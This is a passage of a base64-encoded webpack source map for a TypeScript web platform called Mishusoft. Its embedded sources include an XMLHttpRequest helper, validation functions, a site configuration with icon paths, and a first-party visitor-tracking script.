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N4RixrRkFBWSxDQUFDO1FBQ1QsT0FBTyxFQUFFLGtCQUFrQjtRQUMzQixJQUFJLEVBQUU7WUFDRixRQUFRLEVBQUUsU0FBUztZQUNuQixXQUFXLEVBQUUsTUFBTSxDQUFDLFFBQVEsQ0FBQyxNQUFNO1NBQ3RDO0tBQ0osQ0FBQyxDQUFDO0FBQ1AsQ0FBQyxDQUFDLENBQUM7QUFFSCxxQkFBcUIiLCJzb3VyY2VzIjpbIndlYnBhY2s6Ly8vLi90eXBlc2NyaXB0cy9jb21tb24vcmVxdWVzdC50cyIsIndlYnBhY2s6Ly8vLi90eXBlc2NyaXB0cy9jb21tb24vdmFsaWRhdGlvbi50cyIsIndlYnBhY2s6Ly8vLi90eXBlc2NyaXB0cy9kYi9hcHAudHMiLCJ3ZWJwYWNrOi8vLy4vdHlwZXNjcmlwdHMvZGIvdHJhY2tlci50cyIsIndlYnBhY2s6Ly8vLi90eXBlc2NyaXB0cy9taXNodXNvZnQvVHJhY2tlci50cyIsIndlYnBhY2s6Ly8vLi90eXBlc2NyaXB0cy9taXNodXNvZnQvYnJvd3Nlci50cyIsIndlYnBhY2s6Ly8vd2VicGFjay9ib290c3RyYXAiLCJ3ZWJwYWNrOi8vL3dlYnBhY2svcnVudGltZS9kZWZpbmUgcHJvcGVydHkgZ2V0dGVycyIsIndlYnBhY2s6Ly8vd2VicGFjay9ydW50aW1lL2hhc093blByb3BlcnR5IHNob3J0aGFuZCIsIndlYnBhY2s6Ly8vd2VicGFjay9ydW50aW1lL21ha2UgbmFtZXNwYWNlIG9iamVjdCIsIndlYnBhY2s6Ly8vLi90eXBlc2NyaXB0cy90cmFja2VyLnRzIl0sInNvdXJjZXNDb250ZW50IjpbImltcG9ydCB7IElzSnNvblN0cmluZyB9IGZyb20gXCIuL3ZhbGlkYXRpb25cIjtcblxuZXhwb3J0IGZ1bmN0aW9uIHNlbmRSZXF1ZXN0KG9wdGlvbnM6IHsgbWV0aG9kOiBzdHJpbmc7IHVybDogc3RyaW5nOyBhc3luYzogYm9vbGVhbjsgaGVhZGVyPzogYW55W107IGRhdGE/OiBhbnkgfSwgY2FsbGJhY2s/OiAoYXJnMDogc3RyaW5nKSA9PiB2b2lkLCBmYWxsYmFjaz86IChhcmcwOiBFcnJvcikgPT4gdm9pZCkge1xuICAgIGxldCBkYXRhVHlwZSA9IFwidW5yZWNvZ25pemVkXCI7XG5cbiAgICBpZiAodHlwZW9mIG9wdGlvbnMgPT09IFwib2JqZWN0XCIpIHtcbiAgICAgICAgaWYgKG9wdGlvbnMubWV0aG9kICE9PSBcIlwiICYmIG9wdGlvbnMudXJsICE9PSBcIlwiKSB7XG4gICAgICAgICAgICBpZiAodHlwZW9mIFhNTEh0dHBSZXF1ZXN0ICE9PSBcInVuZGVmaW5lZFwiKSB7XG4gICAgICAgICAgICAgICAgbGV0IHJlcXVlc3QgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTtcbiAgICAgICAgICAgICAgICByZXF1ZXN0Lm9wZW4ob3B0aW9ucy5tZXRob2QsIG9wdGlvbnMudXJsLCBvcHRpb25zLmFzeW5jKTtcblxuICAgICAgICAgICAgICAgIC8vc2V0IGhlYWRlciBmb3IgeGhyIHJlcXVlc3RcbiAgICAgICAgICAgICAgICBpZiAob3B0aW9ucy5oZWFkZXIgIT09IHVuZGVmaW5lZCAmJiB0eXBlb2Ygb3B0aW9ucy5oZWFkZXIgPT0gXCJvYmplY3RcIikge1xuICAgICAgICAgICAgICAgICAgICBvcHRpb25zLmhlYWRlci5mb3JFYWNoKChpdGVtKSA9PiB7XG4gICAgICAgICAgICAgICAgICAgICAgICBPYmplY3Qua2V5cyhpdGVtKS5mb3JFYWNoKChuYW1lKSA9PiB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IHZhbHVlID0gaXRlbVtuYW1lXTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXF1ZXN0LnNldFJlcXVlc3RIZWFkZXIobmFtZSwgdmFsdWUpO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICh2YWx1ZS5pbmRleE9mKFwiZm9ybVwiKSAhPT0gLTEpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0YVR5cGUgPSBcImZvcm1EYXRhXCI7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICh2YWx1ZS5pbmRleE9mKFwianNvblwiKSAhPT0gLTEpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0YVR5cGUgPSBcImpzb25EYXRhXCI7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgIH1cblxuICAgICAgICAgICAgICAgIC8vc2VuZCBkYXRhIHdpdGggeGhyIHJlcXVlc3RcbiAgICAgICAgICAgICAgICBpZiAoZGF0YVR5cGUgIT09IFwidW5yZWNvZ25pemVkXCIpIHtcbiAgICAgICAgICAgICAgICAgICAgaWYgKG9wdGlvbnMuZGF0YSAhPT0gdW5kZWZpbmVkICYmIHR5cGVvZiBvcHRpb25zLmRhdGEgPT0gXCJvYmplY3RcIikge1xuICAgICAgICAgICAgICAgICAgICAgICAgLy9zZW5kIGpzb24gZGF0YVxuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGRhdGFUeXBlID09PSBcImpzb25EYXRhXCIpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXF1ZXN0LnNlbmQoSlNPTi5zdHJpbmdpZnkob3B0aW9ucy5kYXRhKSk7XG4gICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgICAgICAvL3NlbmQgZm9ybSBkYXRhXG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoZGF0YVR5cGUgPT09IFwiZm9ybURhdGFcIikge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCBmb3JtRGF0YSA9IG5ldyBGb3JtRGF0YSgpO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIE9iamVjdC5rZXlzKG9wdGlvbnMuZGF0YSkuZm9yRWFjaChmdW5jdGlvbiAoa2V5KSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvcm1EYXRhLmFwcGVuZChrZXksIG9wdGlvbnMuZGF0YVtrZXldKTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXF1ZXN0LnNlbmQoZm9ybURhdGEpO1xuICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgICAgICAgICAgaWYgKElzSnNvblN0cmluZyhvcHRpb25zLmRhdGEpIHx8IHR5cGVvZiBvcHRpb25zLmRhdGEgPT09IFwib2JqZWN0XCIpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIHJlcXVlc3Quc2V0UmVxdWVzdEhlYWRlcihcIkNvbnRlbnQtdHlwZVwiLCBcImFwcGxpY2F0aW9uL2pzb247IGNoYXJzZXQ9dXRmLThcIik7XG4gICAgICAgICAgICAgICAgICAgICAgICByZXF1ZXN0LnNlbmQoSlNPTi5zdHJpbmdpZnkob3B0aW9ucy5kYXRhKSk7XG4gICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICAgICAgICAgICAgICByZXF1ZXN0LnNlbmQoKTtcbiAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIH1cblxuICAgICAgICAgICAgICAgIC8vY2F0Y2ggc3RhdGUgb2YgeGhyXG4gICAgICAgICAgICAgICAgcmVxdWVzdC5vbnJlYWR5c3RhdGVjaGFuZ2UgPSBmdW5jdGlvbiAoKSB7XG4gICAgICAgICAgICAgICAgICAgIGlmICh0aGlzLnJlYWR5U3RhdGUgPT09IDQpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmICh0aGlzLnN0YXR1cyA9PT0gMCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChmYWxsYmFjaykge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmYWxsYmFjayhuZXcgRXJyb3IoYFJlcXVlc3Qgc2VuZCBmYWlsZWQgJHtvcHRpb25zLnVybH1gKSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHRoaXMuc3RhdHVzID09PSAyMDApIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoY2FsbGJhY2spIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2FsbGJhY2sodGhpcy5yZXNwb25zZVRleHQpO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIH07XG4gICAgICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgICAgIGlmIChmYWxsYmFjaykge1xuICAgICAgICAgICAgICAgICAgICBmYWxsYmFjayhuZXcgRXJyb3IoXCJSdW50aW1lIEVudmlyb25tZW50IGNvdWxkIG5vdCBzdXBwb3J0IFhNTEh0dHBSZXF1ZXN0XCIpKTtcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICB9XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICBpZiAoZmFsbGJhY2spIHtcbiAgICAgICAgICAgICAgICBmYWxsYmFjayhuZXcgRXJyb3IoXCJSZXF1ZXN0IE1ldGhvZCBhbmQgVVJMIGNhbiBub3QgYmUgZW1wdHlcIikpO1xuICAgICAgICAgICAgfVxuICAgICAgICB9XG4gICAgfSBlbHNlIHtcbiAgICAgICAgaWYgKGZhbGxiYWNrKSB7XG4gICAgICAgICAgICBmYWxsYmFjayhuZXcgRXJyb3IoXCJJbnZhbGlkIG9wdGlvbnNcIikpO1xuICAgICAgICB9XG4gICAgfVxufVxuIiwiLyoqXHJcbiAqIEBwYXJhbSBzdHIgdmFsaWQgc3RyaW5nXHJcbiAqICovXHJcbmV4cG9ydCBmdW5jdGlvbiBjaGVja0R1cGxpY2F0ZShzdHI6IHN0cmluZykge1xyXG4gICAgZm9yIChsZXQgaSA9IDA7IGkgPCBzdHIubGVuZ3RoOyBpKyspIHtcclxuICAgICAgICBsZXQgcmUgPSBuZXcgUmVnRXhwKFwiW15cIiArIHN0cltpXSArIFwiXVwiLCBcImdcIik7XHJcbiAgICAgICAgaWYgKHN0ci5yZXBsYWNlKHJlLCBcIlwiKS5sZW5ndGggPj0gMikge1xyXG4gICAgICAgICAgICByZXR1cm4gdHJ1ZTtcclxuICAgICAgICB9XHJcbiAgICB9XHJcbiAgICByZXR1cm4gZmFsc2U7XHJcbn1cclxuXHJcblxyXG4vKipcclxuICogQHBhcmFtIG4gYW55XHJcbiAqICovXHJcbmV4cG9ydCBmdW5jdGlvbiBpc051bWJlcihuOiBhbnkpIHtcclxuICAgIHJldHVybiAhaXNOYU4ocGFyc2VGbG9hdChuKSkgJiYgaXNGaW5pdGUobik7XHJcbn1cclxuXHJcblxyXG4vKipcclxuICogQHBhcmFtIHN0cmluZyBzdHJpbmdcclxuICogKi9cclxuZXhwb3J0IGZ1bmN0aW9uIElzSnNvblN0cmluZyhzdHJpbmc6IHN0cmluZykge1xyXG4gICAgdHJ5IHtcclxuICAgICAgICBKU09OLnBhcnNlKHN0cmluZyk7XHJcbiAgICB9IGNhdGNoIChlKSB7XHJcbiAgICAgICAgcmV0dXJuIGZhbHNlO1xyXG4gICAgfVxyXG4gICAgcmV0dXJuIHRydWU7XHJcbn1cclxuXHJcbiIsIi8qIGdsb2JhbCBfcm9vdF8gKi9cbi8qaW5pdGlhbGl6ZSBvbiBleHRlbnNpb24gaW5zdGFsbGVkKi9cblxubGV0IF9fYXBwSG9zdGVkU2VydmVyUm9vdDpzdHJpbmc7XG5sZXQgdGVtcCA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJyNtaXNodXNvZnQtd2ViLXJvb3QnKT8uZ2V0QXR0cmlidXRlKCdjb250ZW50Jyk7XG5cbmlmICh0eXBlb2YgdGVtcCA9PT0gbnVsbCkge1xuICAgIF9fYXBwSG9zdGVkU2VydmVyUm9vdCA9ICcvJztcbn0gZWxzZSBpZiAodHlwZW9mIHRlbXAgPT09IHVuZGVmaW5lZCkge1xuICAgIF9fYXBwSG9zdGVkU2VydmVyUm9vdCA9ICdodHRwOi8vbG9jYWxob3N0Lyc7XG4gICAgLypyZXF1aXJlZCB2YXJpYWJsZXMqL1xufSBlbHNlICB7XG4gICAgLy8gQHRzLWlnbm9yZVxuICAgIF9fYXBwSG9zdGVkU2VydmVyUm9vdCA9IHRlbXAudG9TdHJpbmcoKTtcbn1cblxuXG5pZiAoX19hcHBIb3N0ZWRTZXJ2ZXJSb290LnN1YnN0cigtMSkgIT09ICcvJykge1xuICAgIF9fYXBwSG9zdGVkU2VydmVyUm9vdCArPSAnLyc7XG59XG5cblxuZXhwb3J0IGNvbnN0IGFwcEhvc3QgPSBfX2FwcEhvc3RlZFNlcnZlclJvb3Q7XG5cblxuZXhwb3J0IGNvbnN0IGFwcCA9IHtcbiAgICBcImRlZmF1bHRcIjoge1xuICAgICAgICBcIm5hbWVcIjogJ21pc2h1c29mdCcsXG4gICAgICAgIFwidmVyc2lvblwiOiAnb2ZmaWNpYWwnLFxuICAgICAgICBcImF1dGhvclwiOiAnTXIuIEFsLUFtaW4gQWhhbWVkIChBYmlyKScsXG4gICAgICAgIFwiY2hhcnNldFwiOiAndXRmOG1iNCcsXG4gICAgICAgIFwicHJlZml4XCI6ICdtc3UnLFxuICAgICAgICBcImNvbXBhbnlOYW1lXCI6ICdNaXNodXNvZnQgU3lzdGVtcyBJbmNvcnBvcmF0ZS4nLFxuICAgICAgICBcInRleHRcIjoge1xuICAgICAgICAgICAgXCJ3ZWxjb21lXCI6IFwiV2VsY29tZSB0byBNaXNodXNvZnQgUGxhdGZvcm1cIixcbiAgICAgICAgICAgIFwiZGVzY3JpcHRpb25cIjogXCJNaXNodXNvZnQgUGxhdGZvcm0gaXMgYSByb2J1c3QgbXVsdGktd2ViIHBsYXRmb3JtIGRldmVsb3BlZCBieSBNaXNodXNvZnQgU3lzdGVtcyBJbmMuIFRoaXMgcGxhdGZvcm0gaXMgY2FwYWJsZSBvZiBnZXR0aW5nIHlvdXIgd29yayBkb25lIHF1aWNrbHkgYW5kIGFjY3VyYXRlbHkuXCIsXG4gICAgICAgICAgICBcImluc3RhbGxfc3RhdGVcIjogXCJUaGUgYXBwbGljYXRpb24gaXMgcmVhZHkgdG8gYmUgaW5zdGFsbGVkIG9uIHlvdXIgZGV2aWNlIGF0IHRoaXMgdGltZS5cIixcbiAgICAgICAgfVxuICAgIH0sXG4gICAgXCJjb250ZW50XCI6IHtcbiAgICAgICAgXCJmb2xkZXJcIjoge1xuICAgICAgICAgICAgXCJsb2dvc1wiOiBfX2FwcEhvc3RlZFNlcnZlclJvb3QgKyAnbWVkaWEvbG9nb3MvJyxcbiAgICAgICAgICAgIFwiY3NzXCI6IF9fYXBwSG9zdGVkU2VydmVyUm9vdCArICdhc3NldHMvY3NzLycsXG4gICAgICAgICAgICBcImpzXCI6IF9fYXBwSG9zdGVkU2VydmVyUm9vdCArICdhc3NldHMvanMvJyxcbiAgICAgICAgICAgIFwiaW1hZ2VzXCI6IF9fYXBwSG9zdGVkU2VydmVyUm9vdCArICdhc3NldHMvaW1hZ2VzLycsXG4gICAgICAgIH0sXG4gICAgICAgIFwiZmlsZVwiOiB7XG4gICAgICAgICAgICBcImRlZmF1bHRcIjoge1xuICAgICAgICAgICAgICAgIFwibGlua1wiOiBbXG4gICAgICAgICAgICAgICAgICAgIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIFwiaHJlZlwiOiBfX2FwcEhvc3RlZFNlcnZlclJvb3QgKyBcIm1lZGlhL2xvZ29zL2FwcGxlLWljb24tNTd4NTcucG5nXCIsXG4gICAgICAgICAgICAgICAgICAgICAgICBcInJlbFwiOiBcImFwcGxlLXRvdWNoLWljb25cIixcbiAgICAgICAgICAgICAgICAgICAgICAgIFwic2l6ZVwiOiBcIjU3eDU3XCJcbiAgICAgICAgICAgICAgICB9LFxuICAgICAgICAgICAgICAgICAgICB7XG4gICAgICAgICAgICAgICAgICAgICAgICBcImhyZWZcIjogX19hcHBIb3N0ZWRTZXJ2ZXJSb290ICsgXCJtZWRpYS9sb2dvcy9hcHBsZS1pY29uLTYweDYwLnBuZ1wiLFxuICAgICAgICAgICAgICAgICAgICAgICAgXCJyZWxcIjogXCJhcHBsZS10b3VjaC1pY29uXCIsXG4gICAgICAgICAgICAgICAgICAgICAgICBcInNpemVcIjogXCI2MHg2MFwiXG4gICAgICAgICAgICAgICAgfSxcbiAgICAgICAgICAgICAgICAgICAge1xuICAgICAgICAgICAgICAgICAgICAgICAgXCJocmVmXCI6IF9fYXBwSG9zdGVkU2VydmVyUm9vdCArIFwibWVkaWEvbG9nb3MvYXBwbGUtaWNvbi03Mng3Mi5wbmdcIixcbiAgICAgICAgICAgICAgICAgICAgICAgIFwicmVsXCI6IFwiYXBwbGUtdG91Y2gtaWNvblwiLFxuICAgICAgICAgICAgICAgICAgICAgICAgXCJzaXplXCI6IFwiNzJ4NzJcIlxuICAgICAgICAgICAgICAgIH0sXG4gICAgICAgICAgICAgICAgICAgIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIFwiaHJlZlwiOiBfX2FwcEhvc3RlZFNlcnZlclJvb3QgKyBcIm1lZGlhL2xvZ29zL2FwcGxlLWljb24tNzZ4NzYucG5nXCIsXG4gICAgICAgICAgICAgICAgICAgICAgICBcInJlbFwiOiBcImFwcGxlLXRvdWNoLWljb25cIixcbiAgICAgICAgICAgICAgICAgICAgICAgIFwic2l6ZVwiOiBcIjc2eDc2XCJcbiAgICAgICAgICAgICAgICB9LFxuICAgICAgICAgICAgICAgICAgICB7XG4gICAgICAgICAgICAgICAgICAgICAgICBcImhyZWZcIjogX19hcHBIb3N0ZWRTZXJ2ZXJSb290ICsgXCJtZWRpYS9sb2dvcy9hcHBsZS1pY29uLTExNHgxMTQucG5nXCIsXG4gICAgICAgICAgICAgICAgICAgICAgICBcInJlbFwiOiBcImFwcGxlLXRvdWNoLWljb25cIixcbiAgICAgICAgICAgICAgICAgICAgICAgIFwic2l6ZVwiOiBcIjExNHgxMTRcIlxuICAgICAgICAgICAgICAgIH0sXG4gICAgICAgICAgICAgICAgICAgIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIFwiaHJlZlwiOiBfX2FwcEhvc3RlZFNlcnZlclJvb3QgKyBcIm1lZGlhL2xvZ29zL2FwcGxlLWljb24tMTIweDEyMC5wbmdcIixcbiAgICAgICAgICAgICAgICAgICAgICAgIFwicmVsXCI6IFwiYXBwbGUtdG91Y2gtaWNvblwiLFxuICAgICAgICAgICAgICAgICAgICAgICAgXCJzaXplXCI6IFwiMTIweDEyMFwiXG4gICAgICAgICAgICAgICAgfSxcbiAgICAgICAgICAgICAgICAgICAge1xuICAgICAgICAgICAgICAgICAgICAgICAgXCJocmVmXCI6IF9fYXBwSG9zdGVkU2VydmVyUm9vdCArIFwibWVkaWEvbG9nb3MvYXBwbGUtaWNvbi0xNDR4MTQ0LnBuZ1wiLFxuICAgICAgICAgICAgICAgICAgICAgICAgXCJyZWxcIjogXCJhcHBsZS10b3VjaC1pY29uXCIsXG4gICAgICAgICAgICAgICAgICAgICAgICBcInNpemVcIjogXCIxNDR4MTQ0XCJcbiAgICAgICAgICAgICAgICB9LFxuICAgICAgICAgICAgICAgICAgICB7XG4gICAgICAgICAgICAgICAgICAgICAgICBcImhyZWZcIjogX19hcHBIb3N0ZWRTZXJ2ZXJSb290ICsgXCJtZWRpYS9sb2dvcy9hcHBsZS1pY29uLTE1MngxNTIucG5nXCIsXG4gICAgICAgICAgI